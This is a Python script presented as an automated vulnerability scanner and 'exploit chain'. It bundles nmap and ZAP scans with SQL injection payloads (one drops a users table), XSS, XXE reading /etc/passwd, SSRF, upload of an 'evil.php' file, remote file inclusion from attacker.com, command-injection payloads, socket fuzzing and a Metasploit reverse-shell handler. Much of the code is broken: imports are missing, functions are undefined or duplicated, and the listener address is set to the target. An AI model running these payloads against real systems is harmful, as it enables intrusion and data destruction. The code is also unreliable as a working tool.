import subprocess
import threading
import asyncio
import time
import socket
import requests
import json
import csv
from fpdf import FPDF
from zapv2 import ZAPv2
import hashlib
import logging
from retrying import retry

VIRUSTOTAL_API_KEY = "your_virustotal_api_key"
VIRUSTOTAL_URL = "https://www.virustotal.com/api/v3/ip_addresses/"

def log_results(message, level=logging.INFO):
    """Log results for auditing purposes."""
    logging.basicConfig(filename='vulnerability_scan.log', level=logging.DEBUG)
    logging.log(level, f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {message}")

@retry(stop_max_attempt_number=3, wait_fixed=2000)
def request_with_delay(url, delay=3):
    """Adds a delay between requests to avoid rate-limiting or being blocked."""
    try:
        response = requests.get(url, timeout=10)
    except requests.exceptions.Timeout:
    	log_results(f"[!] Request timeout for {url}")
    except requests.exceptions.RequestException as e:
        log_results(f"Error making request with delay: {e}", level=logging.ERROR)
        raise

def nmap_scan(target_ip):
    """Perform an NMAP scan on the target IP."""
    try:
        command = f"nmap -A {target_ip}"
        result = subprocess.check_output(command, shell=True, stderr=subprocess.PIPE).decode()
        log_results(f"[+] NMAP scan results for {target_ip}: {result}")
        print(f"[+] NMAP scan results for {target_ip}: {result}")
    except subprocess.CalledProcessError as e:
        log_results(f"[!] Error with NMAP scan: {e.stderr.decode()}")
        print(f"[!] Error with NMAP scan: {e.stderr.decode()}")

def scan_web_vulnerabilities(target):
    """Scan for common web application vulnerabilities."""
    log_results(f"Starting web vulnerability scan for {target}")
    check_for_sql_injections(target)
    check_for_xss(target)
    check_for_csrf(target)
    check_ssl_vulnerabilities(target)

def check_for_sql_injections(target):
    """Detects SQL Injection vulnerabilities in a web application."""
    payloads = ["' OR 1=1 --", "' OR 'a'='a", "'; DROP TABLE users; --"]
    for payload in payloads:
        response = requests.get(f"{target}?id={payload}")
        if "error" in response.text or "Warning" in response.text:
            log_results(f"Potential SQL Injection vulnerability detected at {target} with payload: {payload}")

def check_for_xss(target):
    """Detects Cross-Site Scripting (XSS) vulnerabilities in a web application."""
    payloads = ['<script>alert("XSS")</script>', '<img src="x" onerror="alert(1)">']
    for payload in payloads:
        response = requests.get(f"{target}?input={payload}")
        if payload in response.text:
            log_results(f"Potential XSS vulnerability detected at {target} with payload: {payload}")

def check_for_csrf(target):
    """Detects Cross-Site Request Forgery (CSRF) vulnerabilities in a web application."""
    response = requests.get(f"{target}/change-password", headers={"X-Requested-With": "XMLHttpRequest"})
    if "csrf_token" not in response.text:
        log_results(f"Potential CSRF vulnerability detected at {target}")

def check_ssl_vulnerabilities(target_url):
    """Checks SSL/TLS vulnerabilities such as weak ciphers and certificates."""
    log_results(f"Checking SSL/TLS vulnerabilities for {target_url}")
    try:
        result = subprocess.run(['testssl.sh', '--tls1_2', '--check-all', target_url], capture_output=True, text=True)
        if 'VULNERABLE' in result.stdout:
            log_results(f"SSL/TLS vulnerabilities found for {target_url}")
        else:
            log_results(f"No SSL/TLS vulnerabilities found for {target_url}")
    except Exception as e:
        log_results(f"Error checking SSL/TLS vulnerabilities for {target_url}: {str(e)}")

def check_waf(target_url):
    """Checks if the target has a Web Application Firewall (WAF)."""
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    response = requests.get(target_url, headers=headers)
    if '403 Forbidden' in response.text or 'WAF' in response.headers.get('X-WAF-Protection', ''):
        log_results(f"Web Application Firewall detected on {target_url}")
    else:
        log_results(f"No WAF detected on {target_url}")

def start_zap_scan(target_url):
    """Start a scan using ZAP API."""
    zap = ZAPv2()
    zap.urlopen(target_url)
    zap.spider.scan(target_url)
    while int(zap.spider.status) < 100:
        log_results(f"Spider scan progress: {zap.spider.status}%")
        time.sleep(5)
    zap.ascan.scan(target_url)
    while int(zap.ascan.status) < 100:
        log_results(f"Active scan progress: {zap.ascan.status}%")
        time.sleep(5)
    log_results(f"ZAP scan completed for {target_url}")
    return zap

def test_vulnerabilities(target_url):
    """Test for multiple web vulnerabilities in one function: XXE, SSRF, XSS, SQLi, File Upload."""
    vulnerabilities = {
        "XXE": {
            "payload": """<?xml version="1.0" encoding="ISO-8859-1"?>
                          <!DOCTYPE foo [ 
                              <!ELEMENT foo ANY >
                              <!ENTITY xxe SYSTEM "file:///etc/passwd">
                          ]>
                          <foo>&xxe;</foo>""",
            "method": "POST",
            "headers": {'Content-Type': 'application/xml'},
            "check": lambda response: "root" in response.text,
            "message": "XXE vulnerability detected"
        },
        "SSRF": {
            "payload": "http://localhost:8080/admin",  # Targeting an internal service
            "method": "GET",
            "params": {'url': "http://localhost:8080"},
            "check": lambda response: response.status_code == 200 and "admin" in response.text,
            "message": "SSRF vulnerability detected"
        },
        "XSS": {
            "payload": "<script>alert('XSS')</script>",
            "method": "GET",
            "params": {'search': "<script>alert('XSS')</script>"},
            "check": lambda response: "<script>alert('XSS')</script>" in response.text,
            "message": "XSS vulnerability detected"
        },
        "SQLi": {
            "payload": "' OR 1=1 --",
            "method": "GET",
            "params": {'id': "' OR 1=1 --"},
            "check": lambda response: "error" in response.text or "database" in response.text,
            "message": "SQL Injection vulnerability detected"
        },
        "File Upload": {
            "payload": {'file': ('evil.php', open('evil.php', 'rb'))},
            "method": "POST",
            "url": f"{target_url}/upload",
            "check": lambda response: "Upload successful" in response.text,
            "message": "File upload vulnerability detected"
        }
    }

    for vuln, details in vulnerabilities.items():
        try:
            if details["method"] == "POST":
                if "headers" in details:
                    response = requests.post(target_url, data=details["payload"], headers=details["headers"], timeout=10)
                else:
                    response = requests.post(details["url"], files=details["payload"], timeout=10)
            elif details["method"] == "GET":
                response = requests.get(target_url, params=details["params"], timeout=10)

            if details["check"](response):
                log_results(f"{vuln} - {details['message']} at {target_url}")
        except Exception as e:
            log_results(f"Error testing {vuln}: {e}", level=logging.ERROR)

def run_security_audit():
    """Run automated security audits using Lynis and OpenVAS"""
    log_results("Running security audits...")

    try:
        lynis_command = ["lynis", "audit", "system"]
        lynis_result = subprocess.run(lynis_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        if lynis_result.returncode != 0:
            log_results(f"Lynis audit error: {lynis_result.stderr}", level=logging.ERROR)
        else:
            log_results(f"Lynis audit result: {lynis_result.stdout}")
    except subprocess.CalledProcessError as e:
        log_results(f"Error during Lynis audit: {e.output.decode()}", level=logging.ERROR)
    
    try:
        openvas_command = ["openvas-start"]
        openvas_result = subprocess.run(openvas_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        if openvas_result.returncode != 0:
            log_results(f"OpenVAS error: {openvas_result.stderr}", level=logging.ERROR)
        else:
            log_results(f"OpenVAS scan result: {openvas_result.stdout}")
    except subprocess.CalledProcessError as e:
        log_results(f"Error during OpenVAS scan: {e.output.decode()}", level=logging.ERROR)

def post_exploitation(target_ip, payload="linux/x86/meterpreter/reverse_tcp"):
    """Uses Metasploit for post-exploitation (RCE, persistence)"""
    log_results(f"Post-exploitation on target {target_ip}: Running Metasploit...")
    
    metasploit_command = [
        "msfconsole", "-x",
        f"use exploit/multi/handler; set payload {payload}; set LHOST {target_ip}; exploit"
    ]
    
    try:
        result = subprocess.run(metasploit_command, capture_output=True, text=True)
        if result.returncode == 0:
            log_results(f"Post-exploitation completed: {result.stdout}")
            return True
        else:
            log_results(f"Metasploit error: {result.stderr}", level=logging.ERROR)
            return False
    except Exception as e:
        log_results(f"Error during post-exploitation: {e}", level=logging.ERROR)
        return False

def compliance_check(target_ip):
    """Run automated compliance checks for PCI-DSS, GDPR, HIPAA"""
    log_results("Running compliance checks...")

    compliance_tools = {
        "PCI-DSS": "openscap-compliance-check --profile pci-dss",
        "GDPR": "openscap-compliance-check --profile gdpr",
        "HIPAA": "openscap-compliance-check --profile hipaa"
    }
    
    results = {}

    for standard, command in compliance_tools.items():
        try:
            log_results(f"Checking {standard} compliance...")
            result = subprocess.run(command.split(), capture_output=True, text=True)
            if result.returncode == 0:
                results[standard] = "Passed"
            else:
                results[standard] = f"Failed: {result.stderr}"
        except Exception as e:
            results[standard] = f"Error: {e}"

    for standard, result in results.items():
        log_results(f"{standard} Compliance: {result}")

    return results

def check_threat_intelligence(target_ip):
    """Integrate threat intelligence feeds to check for emerging vulnerabilities."""
    feed_url = "https://cve.circl.lu/api/cve/"
    response = requests.get(f"{feed_url}{target_ip}")
    if response.status_code == 200:
        cve_data = response.json()
        for entry in cve_data['CVE_Items']:
            cve_id = entry['cve']['CVE_data_meta']['ID']
            description = entry['cve']['description']['description_data'][0]['value']
            log_results(f"Vulnerability found for {target_ip}: {cve_id} - {description}")
    else:
        log_results(f"Threat feed lookup failed for {target_ip}")

def ai_based_threat_detection(network_traffic_data):
    """Detect potential zero-day vulnerabilities or attack patterns using AI/ML."""
    log_results("Running AI-based threat detection...")
    
    try:
        model = IsolationForest(n_estimators=100, contamination=0.1)
        model.fit(network_traffic_data)
        anomalies = model.predict(network_traffic_data)

        anomaly_indices = np.where(anomalies == -1)[0]  # Indices of anomalous instances
        if anomaly_indices.size > 0:
            log_results(f"Anomalies detected at indices: {anomaly_indices}")
        else:
            log_results("No anomalies detected.")
        return True
    except Exception as e:
        log_results(f"Error during AI-based detection: {e}", level=logging.ERROR)
        return False

def integrate_threat_intelligence(target_ip):
    """Integrate threat intelligence feeds to check for emerging vulnerabilities."""
    log_results("Integrating real-time threat intelligence...")
    headers = {"x-apikey": VIRUSTOTAL_API_KEY}
    
    attempt = 0
    while attempt < 3:  # Retry up to 3 times
        try:
            response = requests.get(f"{VIRUSTOTAL_URL}{target_ip}", headers=headers)
            if response.status_code == 200:
                data = response.json()
                malicious_count = data['data']['attributes']['last_analysis_stats']['malicious']
                if malicious_count > 0:
                    log_results(f"Malicious activity detected for IP: {target_ip}")
                else:
                    log_results(f"No malicious activity detected for IP: {target_ip}")
                return True
            else:
                log_results(f"Failed to fetch threat intelligence: {response.status_code}")
                return False
        except requests.exceptions.RequestException as e:
            log_results(f"Error during threat intelligence integration: {e}", level=logging.WARNING)
            time.sleep(2 ** attempt)
            attempt += 1
    return False

def generate_exploit_report(report_data, report_format="html"):
    """Generate advanced exploitation reports in HTML/PDF/CSV format."""
    if report_format == "html":
        generate_html_report(report_data)
    elif report_format == "pdf":
        generate_pdf_report(report_data)
    elif report_format == "csv":
        generate_csv_report(report_data)

def generate_html_report(report_data):
    """Generate an HTML report."""
    with open("exploit_report.html", "w") as html_file:
        html_file.write("<html><body><h1>Exploit Report</h1><ul>")
        for data in report_data:
            html_file.write(f"<li>{data}</li>")
        html_file.write("</ul></body></html>")
    log_results("HTML report generated.")

def generate_pdf_report(report_data):
    """Generate a PDF report using FPDF."""
    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("Arial", size=12)
    pdf.cell(200, 10, txt="Exploit Report", ln=True, align="C")
    for data in report_data:
        pdf.cell(200, 10, txt=data, ln=True)
    pdf.output("exploit_report.pdf")
    log_results("PDF report generated.")

def generate_csv_report(report_data):
    """Generate a CSV report."""
    with open('exploit_report.csv', mode='w', newline='') as file:
        writer = csv.writer(file)
        writer.writerow(["Exploit Data"])
        for data in report_data:
            writer.writerow([data])
    log_results("CSV report generated.")

def check_file_inclusion(target_url):
    """Detects Local/Remote File Inclusion vulnerabilities."""
    payloads = [
        "../../../../etc/passwd", "/etc/passwd", "http://attacker.com/malicious_script.php"
    ]
    for payload in payloads:
        response = request_with_delay(target_url + payload)
        if response and "root:x:" in response.text:
            log_results(f"[+] Potential LFI vulnerability found at {target_url}")
            print(f"[+] Potential LFI vulnerability found at {target_url}")
            break

def check_command_injection(target_url):
    """Detects Command Injection vulnerabilities."""
    payloads = ["; ls", "| ls", "ls"]
    for payload in payloads:
        response = request_with_delay(target_url + payload)
        if response and "root" in response.text:
            log_results(f"[+] Potential Command Injection vulnerability found at {target_url}")
            print(f"[+] Potential Command Injection vulnerability found at {target_url}")
            break

def enumerate_subdomains(target_domain):
    """Perform subdomain enumeration using a tool like Sublist3r."""
    try:
        command = f"sublist3r -d {target_domain}"
        result = subprocess.check_output(command, shell=True, stderr=subprocess.PIPE).decode()
        log_results(f"[+] Subdomains for {target_domain}: {result}")
        print(f"[+] Subdomains for {target_domain}: {result}")
    except subprocess.CalledProcessError as e:
        log_results(f"[!] Error with subdomain enumeration: {e.stderr.decode()}")
        print(f"[!] Error with subdomain enumeration: {e.stderr.decode()}")

def check_clickjacking(target_url):
    """Detects Clickjacking vulnerabilities."""
    response = request_with_delay(target_url)
    if response and 'X-Frame-Options' not in response.headers:
        log_results(f"[!] Clickjacking vulnerability found at {target_url}")
        print(f"[!] Clickjacking vulnerability found at {target_url}")

def check_open_redirect(target_url):
    """Checks for Open Redirect vulnerabilities."""
    payloads = ["http://evil.com", "javascript:alert(1);"]
    for payload in payloads:
        response = request_with_delay(f"{target_url}?redirect={payload}")
        if response and payload in response.url:
            log_results(f"[+] Open Redirect vulnerability found at {target_url}")
            print(f"[+] Open Redirect vulnerability found at {target_url}")
            break

def check_dns_zone_transfer(target_ip):
    """Checks for DNS Zone Transfer vulnerabilities."""
    try:
        command = f"dig @{target_ip} axfr"
        result = subprocess.check_output(command, shell=True, stderr=subprocess.PIPE).decode()
        log_results(f"[+] DNS Zone Transfer Results: {result}")
        print(f"[+] DNS Zone Transfer Results: {result}")
    except subprocess.CalledProcessError as e:
        log_results(f"[!] DNS Zone Transfer check error: {e.stderr.decode()}")
        print(f"[!] DNS Zone Transfer check error: {e.stderr.decode()}")

def scan_web_vulnerabilities(target_url):
    """Scan the target URL for various web vulnerabilities."""
    log_results(f"[+] Scanning {target_url} for vulnerabilities...")
    check_file_inclusion(target_url)
    check_command_injection(target_url)
    check_clickjacking(target_url)
    check_open_redirect(target_url)

async def port_scanner_async(ip):
    try:
        scanner = nmap.PortScanner()
        scanner.scan(ip, '1-1024')  # Scanning ports 1-1024
        open_ports = [port for port in scanner[ip]['tcp'] if scanner[ip]['tcp'][port]['state'] == 'open']
        return open_ports
    except Exception as e:
        print(f"Error during port scanning: {e}")
        return []

def check_service_versions(ip, ports, retries=3, timeout=5):
    services = {}
    for port in ports:
        attempt = 0
        while attempt < retries:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                sock.connect((ip, port))
                sock.sendall(b'HEAD / HTTP/1.1\r\n\r\n')  # Send a simple HTTP request for banner
                banner = sock.recv(1024).decode().strip()
                if not banner:
                    banner = "No banner received"
                services[port] = banner
                sock.close()
                break
            except socket.timeout:
                attempt += 1
                if attempt < retries:
                    print(f"Timeout on port {port}, retrying...")
                else:
                    services[port] = "Error: Timeout"
                    print(f"Timeout after {retries} attempts on port {port}")
            except Exception as e:
                services[port] = f"Error: {e}"
                break
    return services

def check_web_vulnerabilities(url):
    vulnerabilities = []
    try:
        response = requests.get(url, timeout=5)
        headers = response.headers
        if 'X-Content-Type-Options' not in headers:
            vulnerabilities.append("Missing X-Content-Type-Options")
        if 'X-Frame-Options' not in headers:
            vulnerabilities.append("Missing X-Frame-Options")
        if 'Strict-Transport-Security' not in headers:
            vulnerabilities.append("Missing Strict-Transport-Security")
    except requests.exceptions.RequestException as e:
        print(f"Error while checking web vulnerabilities: {e}")
    return vulnerabilities

async def fuzz_input_to_service_async(ip, port, fuzz_attempts=100, payload_sizes=[512, 1024, 2048, 4096], pattern="A", pattern_type="repeat", timeout=5):
    """Asynchronous fuzzing function to test input handling for vulnerabilities."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            sock.connect((ip, port))
            
            for fuzz_size in payload_sizes:
                for _ in range(fuzz_attempts):
                    fuzz_data = generate_fuzz_payload(fuzz_size, pattern, pattern_type)
                    start_time = time.time()
                    sock.sendall(fuzz_data.encode())
                    response = sock.recv(4096)
                    elapsed_time = time.time() - start_time

                    if elapsed_time > timeout:
                        log_results(f"Timeout occurred while fuzzing {ip}:{port} with {fuzz_size} bytes payload.")
                    if len(response) > 0:
                        log_results(f"Fuzzing detected at {ip}:{port} with payload size {fuzz_size}")
            sock.close()
    except Exception as e:
        log_results(f"Error fuzzing {ip}:{port}: {str(e)}")

async def check_service_versions_async(ip, ports):
    services = {}
    for port in ports:
        services[port] = "Service Version X"  # This should be replaced with actual logic
    return services

def generate_fuzz_payload(size, pattern="A", pattern_type="repeat"):
    """Generate fuzz data based on specified pattern and size."""
    if pattern_type == "repeat":
        return pattern * size
    elif pattern_type == "random":
        return ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=size))
    return pattern * size

async def vulnerability_scanner_async(ip, url):
    print(f"Scanning {ip} for open ports...")
    open_ports = await port_scanner_async(ip)
    
    if not open_ports:
        print("No open ports found or error during port scanning.")
        return

    print(f"Open ports found: {open_ports}")

    print("\nChecking service versions...")
    service_versions = await check_service_versions_async(ip, open_ports)
    for port, version in service_versions.items():
        print(f"Port {port}: {version}")

    print("\nChecking web vulnerabilities...")
    web_vulns = await check_web_vulnerabilities(url)
    for vuln in web_vulns:
        print(f"Vulnerability: {vuln}")

    print("\nStarting fuzzing for memory corruption vulnerabilities...")
    fuzz_tasks = [fuzz_input_to_service_async(ip, port) for port in open_ports]
    await asyncio.gather(*fuzz_tasks)

def start_vulnerability_scanning(ip, url):
    loop = asyncio.get_event_loop()
    loop.run_until_complete(vulnerability_scanner_async(ip, url))

def run_exploit_chain():
    target_url = "http://example.com"
    target_ip = "192.168.1.1"
    
    scan_web_vulnerabilities(target_url)
    check_waf(target_url)
    check_ssl_vulnerabilities(target_url)
    
    start_zap_scan(target_url)
    
    test_xxe(target_url)
    test_ssrf(target_url)
    test_xss(target_url)
    test_sqli(target_url)
    test_file_upload(target_url)

    check_threat_intelligence(target_ip)

    generate_exploit_report(["Exploitation successful!", "Vulnerability found: SQLi"], "pdf")

    log_results("Exploit chain completed.")